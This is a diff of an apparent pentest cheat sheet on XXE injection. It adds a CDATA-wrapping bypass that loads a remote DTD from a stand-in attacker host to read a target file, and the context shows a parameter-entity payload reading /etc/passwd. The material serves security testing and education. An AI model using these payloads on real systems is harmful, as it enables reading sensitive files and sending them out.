@@ -1291,6 +1291,7 @@ The declaration of an external entity uses the <code>SYSTEM</code> keyword and m
 <span class="cm">&lt;!-- Public External Entity --&gt;</span>
 <span class="cp">&lt;!ENTITY name PUBLIC "public_user_or_group_id" "external_entity_URI" NDATA TYPE&gt;</span>
 </code></pre></div>
+<p><strong>Note</strong>: when <code>NDATA TYPE</code> is not allowed, in order to allow including files containing XML chars such as <code>&lt;</code> or <code>&gt;</code>, which would otherwise break the parsing, it's necessary to wrap the file content within a <code>&lt;![CDATA[]]&gt;</code> section. See payloads below.</p>
 <p><strong>XML Parameters Entities</strong>
 XML parameter entities are a special kind of XML entity which can only be referenced elsewhere <strong>within the DTD</strong>. The declaration of an XML parameter entity as well as its referencing (instead of the <code>&amp;</code>) includes the <code>%</code> character before the entity name.</p>
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;!ENTITY % name SYSTEM "parameter_entity_URI"&gt;</span>
@@ -1306,6 +1307,23 @@ XML parameter entities are a special kind of XML entity which can only be refere
 
 <span class="cm">&lt;!-- Using XML Parameters Entities --&gt;</span>
 <span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "file:///etc/passwd"&gt;</span><span class="w"> </span>%xxe;<span class="w"> </span>]&gt;
+</code></pre></div>
+<p>Bypass including file containing XML characters that break the parsing using an external DTD, wrapping the file content within a  <code>&lt;![CDATA[]]&gt;</code> section:</p>
+<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- Remote DTD hosted by attacker --&gt;</span>
+<span class="cp">&lt;!ENTITY wrapper "%start;%file;%end;"&gt;</span>
+
+
+<span class="cm">&lt;!-- Include the remote DTD with parameters entities --&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [</span>
+<span class="cp">&lt;!ENTITY % start "&lt;![CDATA["&gt;</span>
+<span class="cp">&lt;!ENTITY % file SYSTEM "file:///targetfile" &gt;</span>
+<span class="cp">&lt;!ENTITY % end "]]&gt;</span>"&gt;
+<span class="cp">&lt;!ENTITY % dtd SYSTEM "http://attacker/wrapper.dtd" &gt;</span>
+%dtd;
+]&gt;
+...
+<span class="w"> </span><span class="nt">&lt;bar&gt;</span><span class="ni">&amp;wrapper;</span><span class="nt">&lt;/bar&gt;</span>
+...
 </code></pre></div>
 <p>XXE SSRF:</p>
 <div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- Using XML External Entities --&gt;</span>
